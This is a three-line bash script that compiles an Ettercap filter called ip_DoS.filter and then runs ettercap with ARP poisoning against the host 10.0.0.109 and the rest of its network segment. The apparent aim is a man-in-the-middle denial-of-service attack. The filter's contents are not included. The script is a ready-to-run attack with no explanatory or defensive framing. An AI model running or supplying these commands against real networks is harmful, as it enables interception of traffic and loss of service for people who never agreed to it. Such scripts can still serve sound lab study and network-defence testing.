#!/bin/bash
sudo etterfilter ip_DoS.filter -o ip_DoS.ef
sudo ettercap -Tq -F ip_DoS.ef -M arp:remote /10.0.0.109/ //
